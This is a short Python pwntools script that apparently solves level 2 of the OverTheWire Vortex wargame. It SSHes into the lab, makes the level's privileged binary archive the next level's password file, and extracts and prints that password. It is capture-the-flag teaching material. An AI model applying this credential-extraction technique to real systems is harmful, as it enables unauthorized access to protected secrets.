#!/usr/bin/env python2

from pwn import *

level    = 2
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)


# For testing locally
# shell.download(binary)

# Add the password to the tarball
shell.run('%s %s' % (binary, passfile))

# Extract it
password = shell.tar('xOf',"'/tmp/ownership.$$.tar'").strip()
log.success('Password: %s' % password)
print password
